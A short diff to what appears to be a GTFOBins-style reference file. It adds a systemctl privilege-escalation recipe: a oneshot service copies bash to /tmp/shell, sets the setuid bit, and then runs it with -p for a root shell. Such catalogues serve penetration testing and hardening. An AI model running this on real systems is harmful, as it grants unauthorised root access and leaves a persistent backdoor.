@@ -10,6 +10,16 @@ functions:
         WantedBy=multi-user.target' > $TF
         ./systemctl link $TF
         ./systemctl enable --now $TF
+    - code: |
+        TF=$(mktemp).service
+        echo '[Service]
+        Type=oneshot
+        ExecStart=/bin/sh -c "cp /bin/bash /tmp/shell && chmod +s+x /tmp/shell"
+        [Install]
+        WantedBy=multi-user.target' > $TF
+        ./systemctl link $TF
+        ./systemctl enable --now $TF
+        /tmp/shell -p
   sudo:
     - code: |
         TF=$(mktemp)
